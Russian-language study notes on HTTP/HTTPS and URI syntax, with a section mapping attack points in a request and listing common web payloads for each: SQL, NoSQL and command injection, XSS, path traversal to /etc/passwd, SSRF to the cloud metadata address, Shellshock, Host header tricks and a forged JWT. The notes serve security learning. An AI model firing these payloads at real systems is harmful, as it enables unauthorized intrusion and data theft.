## **Что такое HTTP/HTTPS?**

**HTTP (HyperText Transfer Protocol)** — протокол передачи данных в формате "клиент-сервер".  
**HTTPS = HTTP + TLS/SSL** — защищённая версия с шифрованием.

#HTTP = порт 80 , без шифрования, быстрая скорость , легко перехватить

#HTTPS= порт 443 , TLS/SSL шифрование , медленнее скорость , защищено от MITM

### ==**Методы запросов (HTTP Methods)**==

GET    /search?q=test            # Получить данные (параметры в URL)
POST   /login                            # Отправить данные (в теле)
PUT    /api/users/1                # Обновить/создать ресурс
DELETE /api/users/1           # Удалить ресурс
HEAD   /                                     # Только заголовки (без тела)
OPTIONS /                                # Какие методы поддерживаются
TRACE  /                                    # Эхо-запрос (опасен для XST)
CONNECT /                              # Для прокси (может быть опасен)
PATCH  /api/users/1             # Частичное обновление

==Версии==
|**HTTP/0.9**|1991|Только GET, нет заголовков|Редко, исторические системы|
|**HTTP/1.0**|1996|Заголовки, методы, коды|Может быть небезопасная конфигурация|

|**HTTP/1.1**|1997|Keep-alive, chunked encoding|**Основная сегодня**, 99% тестов|

|**HTTP/2**|2015|Бинарный, мультиплексирование|Новые *атаки (HPACK, stream abuse)|*
|**HTTP/3**|2022|На базе QUIC (UDP)|Экспериментальные атаки|

==пример    **Запросa на сервер (Request)**==
```http
GET /admin.php?id=1 HTTP/1.1          ← Стартовая строка (Method + Path + Version)  Я хочу **получить** (GET) страницу `/admin.php` с параметром `id=1`, используя протокол версии **HTTP/1.1**"


Host: example.com               --это **адрес назначения**, куда сервер должен отправить ответ

User-Agent: Mozilla/5.0         -- кто я
Cookie: session=abc123          -- данные сессиис/ ключи
Accept: text/html               -- в каком формате вернуть данные
Referrer: https://google.com    -- с какого сайта я отправил это(авто)

Content-Type: application/x-www-form-urlencoded
                                        ← Пустая строка (обязательно!)
                                        **Что это:** "КОНЕЦ ЗАГОЛОВКОВ, дальше идёт ТЕЛО письма".

**Важно:** Без этой пустой строки сервер не поймёт, где кончаются заголовки.


username=admin&password=123           ← Тело (Body, есть не всегда)
```

==пример    **Ответa (Response)**==
```http
HTTP/1.1 200 OK                       ← Статусная строка (Version + Code + Message)
Date: Mon, 23 Dec 2024 12:00:00 GMT   ← дата отправки птсьма
Server: Apache/2.4.41      -- версия сервера 
Content-Type: text/html  
Set-Cookie: session=xyz789    -- новый куки на след раз
Content-Length: 1234
                                        ← Пустая строка
<!DOCTYPE html>                       ← Тело
<html><body>Hello</body></html>
```

==### **B. Коды состояния (Status Codes)**==
```http
1xx - Информационные           # 100 Continue, 101 Switching Protocols

2xx - Успех                    # 200 OK, 201 Created, 204 No Content

3xx - Перенаправление          # 301 Moved Permanently, 302 Found, 
                                                      304 Not Modified
                                                      
4xx - Ошибка клиента           # 400 Bad Request, 401 Unauthorized,
                                 403 Forbidden,   404 Not Found
                                 
5xx - Ошибка сервера           # 500 Internal Server Error, 502 Bad 
Gateway, 503 Service Unavailable
```

# ==места атаки==

==GET /admin.php?id=1 HTTP/1.1==                                ⬅️ МЕСТО 1: Параметры в URL
==Host: example.com==                                                     ⬅️ МЕСТО 2: Host header
==User-Agent: Mozilla/5.0==                                              ⬅️ МЕСТО 3: User-Agent
==Cookie: session=abc123==                                            ⬅️ МЕСТО 4: Cookies
==Accept: text/html==                                                         ⬅️ МЕСТО 5: Accept header
==Referer: https://google.com  ь==                                    ⬅️ МЕСТО 6: Referer
====Content-Type: application/x-www-form-urlencoded== ⬅️ МЕСТО 7: Content-Type
                                                    ⬅️ Пустая строка (разделитель)
==username=admin&password=123==                              ⬅️ МЕСТО 8: Тело запроса (POST параметры)

## 1 MЕСТО  = Параметры в URL
```http
# SQL Injection
GET /admin.php?id=1' OR '1'='1 HTTP/1.1
GET /admin.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1

# XSS
GET /admin.php?id=1"><script>alert(1)</script> HTTP/1.1
GET /admin.php?id=javascript:alert(1) HTTP/1.1

# Path Traversal/LFI
GET /admin.php?id=../../../etc/passwd HTTP/1.1
GET /admin.php?id=....//....//....//etc/passwd HTTP/1.1

# Command Injection
GET /admin.php?id=1;id HTTP/1.1
GET /admin.php?id=1|whoami HTTP/1.1

# SSRF
GET /admin.php?id=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```
## 2 MЕСТО   = Host header
```http
# Host header injection
Host: evil.com
Host: example.com:80@evil.com
Host: example.com\r\nInjected-Header: value

# SSRF через Host
Host: 169.254.169.254
Host: localhost
Host: 127.0.0.1:8080

# Cache poisoning
Host: example.com
X-Forwarded-Host: evil.com
```
## 3 MЕСТО =  User-Agent
```http
# XSS в логах (если логируются)
User-Agent: Mozilla/5.0 <script>alert(1)</script>

# SQL Injection
User-Agent: Mozilla/5.0' OR '1'='1

# Проверка на уязвимости
User-Agent: () { :; }; /bin/bash -c 'id'  # Shellshock
```
## 4 MЕСТО   = Cookies
```http
# Пробуем другие сессии
Cookie: session=admin
Cookie: session=1
Cookie: session=../etc/passwd

# SQL Injection в cookie
Cookie: session=' OR '1'='1
Cookie: session=abc123' UNION SELECT NULL--

# JWT manipulation (если используется JWT)
Cookie: session=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.  # Изменённый JWT
```
## 5 MЕСТО  = Accept header
```http
# Пробуем другие форматы
Accept: application/json
Accept: */*
Accept: text/html;q=0.9,application/xhtml+xml;q=0.8,application/xml;q=0.5,*/*;q=0.1

# Проверка на XSS через content-type
Accept: text/html"><script>alert(1)</script>
```
## 6 MЕСТО  = Referer
```http
# Проверяем, принимает ли Referer
Referer: https://evil.com
Referer: javascript:alert(1)
Referer: data:text/html,<script>alert(1)</script>

# Если сайт проверяет Referer для CSRF защиты
Referer: https://example.com  # Пробуем подделать правильный Referer
```
## 7 MЕСТО  = Content-Type
```http
# Меняем Content-Type
Content-Type: application/json
Content-Type: text/xml
Content-Type: multipart/form-data; boundary=something

# XSS через Content-Type
Content-Type: text/html"><script>alert(1)</script>
```
## 8 MЕСТО = Тело запроса  
```http
# SQL Injection
username=admin' OR '1'='1--&password=anything
username=admin' UNION SELECT NULL,NULL--&password=

# XSS
username=<script>alert(1)</script>&password=test
username="><img src=x onerror=alert(1)>&password=

# Command Injection
username=admin&password=123;id
username=admin&password=123|whoami

# NoSQL Injection (если MongoDB)
username[$ne]=admin&password[$ne]=123
username=admin' || '1'=='1&password=test
```

# ==**URI RFC**
— это **Request for Comments** (документ, описывающий стандарт), который определяет, как должны выглядеть и работать **Uniform Resource Identifiers (URI)**, то есть адреса в интернете.==
# Ключевой стандарт — ==**RFC 3986**==. Он описывает **синтаксис URI**, включая специальные символы.

СТРУКТУРА
```

  https://user:pass@example.com:8080/path/to/file?query=value#fragment
  \___/   \_______/ \_________/ \__/\____________/ \_________/ \______/
    |         |          |        |        |            |         |
  схема   авторизация   хост     порт     путь       запрос    фрагмент

```

СПЕЦ СИМВОЛЫ: **обязательно кодировать**

|**`:`**|     двоеточие|после схемы (`http:`), перед портом (`:8080`)|разделитель схемы и авторизации/хоста

|**`/`**|     слэш|разделитель в пути (`/path/to/file`)|разделяет сегменты пути  \

|**`?`**|     знак вопроса|перед строкой запроса (`?key=value`)|отделяет путь от параметров запроса

|**`#`**|     хэш, решётка|перед фрагментом (`#section1`)|отделяет первую основн часть URI от фрагмента (якоря)

|**`@`**|     собака|в авторизации (`user:pass@host`)|отделяет учётные данные от хоста

|**`&`**|     амперсанд|в строке запроса (`?id=1&name=foo`)|разделяет параметры запроса

|**`=`**|     знак равенства|в строке запроса (`key=value`)|разделяет имя и значение параметра

|**`+`**|     плюс|в строке запроса (часто)|иногда означает пробел (устаревшее)

|**`;`**|     точка с запятой|в пути или строке запроса|разделитель параметров (редко)

|**`,`**|     запятая|в пути|разделитель (редко)

|**Пробел**|    `%20`  или `+`       | нарушает чтение URI|

|**`%`**|              `%25`                    |сам используется для кодировки|

|**`<` `>`|   `%3C`, `%3E`                  |могут конфликтовать с HTML/XML|

|**`"`**|              `%22`                                    |проблемы в JSON/атрибутах|

|**`{` `}` `\|` `\` `^` `[` `]` `\``** \| соотв.` %7B` и т.д. \| имеют особое значение в разных контекстах 

|**Управляющие символы** (0x00-0x1F, 0x7F)|`%00`-`%1F`, `%7F`         |невидимы, могут сломать парсинг

1. **Path Traversal**: Использование `../` (`%2e%2e%2f`) для выхода за пределы директории
2. **Open Redirect**: Манипуляции с `@`, `//`, `?`, `#` для подмены хоста https://example.com@evil.com  →  хост evil.com, а example.com — логин!
3. 1. **HTTP Parameter Pollution**: Множественные `&` или `;` для сбивания логики парсинга
4. 1. **Cache Poisoning**: Манипуляции с `?key=value` и `#fragment` для обхода ключей кэша
